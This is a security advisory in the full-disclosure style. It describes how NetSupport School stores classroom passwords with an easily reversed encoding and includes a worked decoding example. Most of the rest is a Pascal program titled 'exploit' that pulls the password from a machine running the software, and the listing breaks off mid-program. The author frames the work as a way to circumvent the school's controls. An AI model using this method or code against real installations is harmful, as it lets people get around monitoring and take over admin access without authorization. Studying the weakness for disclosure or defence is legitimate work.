Risk    : Password protection weakness

Description: NetSupport School, market leading training tool for the modern 
classroom featuring full student remote control, application & internet 
monitoring, customized student testing and more.

Password protection weakness: The password encryption method is a method 
which is easily reversed. The encryption method is as follows:
The letters are expressed using a hexadecimal type of system. Every letter 
is shown by two characters the first character can be any ascii character 
while the second is in a range from a-p. This works just like hex in that 
ap+1=ba. Its not case sensitive so that also makes it easier for kids to get 
passes. The characters start at EM. So A= EM B=EN and so on. Each letter is 
also added to by the number of letters in front of it. So the crypt of aa= 
EN9O while the crypt of aaa=EO9P>A. I can figure the routine used for the 
crypt of each colum though. Here is a reference for the letter a and its 
crypt of each colum EM, 9O, >a, BC, FE, :G, >I, BK, FM, :O. Based on this 
knowledge and the hex-esque characters, and the addition to each char based 
on the amount of letters in front of it, you can get the password from an 
encrypted one. An example of a cracked password: The crypt is “GC;H@KEO” GC 
-3 = FP (according to the hexish system) FP=T so the first letter is T. Take 
9O (known “a” for the 2nd column) and add the difference from a-t to it (19) 
and you get ;B add 2 to it (amount of letters in front of it) = ;D then 
subtract ;D from ;H you get 4 places. A+4 = E the second letter is “E” you 
continue to do this until you get the password “test”

Solution: based on my research this program uses a hash type validation 
method, so the quickest and most painless solution would be to use the md5 
routine for passwords.

Credits: Credits go to Drexel University, and Harry Hoffman because if they 
hadn’t have used this software I would have never had the urge to circumvent 
it ;)
As well as Mr. Flynn for teaching me pascal (even though its 20+ years old 
its still my favorite)

Here is a program that will decrypt the password off of a machine with the 
software running:
(old school :-D its written in pascal)

program exploit;
uses crt;
var i,j,length,x,y,crazy:integer;
    passfile:text;
    line:string;
    password,p:array [1..100] of char;
    known,convert:array [1..26,1..3] of char;
    ch,tempx,tempy,key:char;

procedure conv;
begin
convert[1,1]:='E';
convert[1,2]:='M';
convert[1,3]:='A';
for i:=2 to 26 do begin
    if convert[i-1,2]='P' then begin
       convert[i,1]:=chr(ord(convert[i-1,1])+1);
       convert[i,2]:='A';
    end
    else begin
         convert[i,1]:=convert[i-1,1];
         convert[i,2]:=chr(ord(convert[i-1,2])+1);
    end;
    convert[i,3]:=chr(ord(convert[i-1,3])+1);
end;
end;

procedure hex(a,b:char; num:integer);
begin
if num>0 then begin
for i:=1 to num do begin
    if b='P' then begin
       b:='A';
       a:=chr(ord(a)+1);
    end else inc(b);
end;
end;
if num<0 then begin
for i:=-1 downto num do begin
    if b='A' then begin
       b:='P';
       a:=chr(ord(a)-1);
    end else dec(b);
end;
end;
tempx:=a;
tempy:=b;
end;

function compare(a,b:char):char;
begin
for i:=1 to 26 do begin
if (a=convert[i,1])and(b=convert[i,2]) then compare:=chr(i+64);
end;
end;

function diff(a,b,c,d:char):integer;
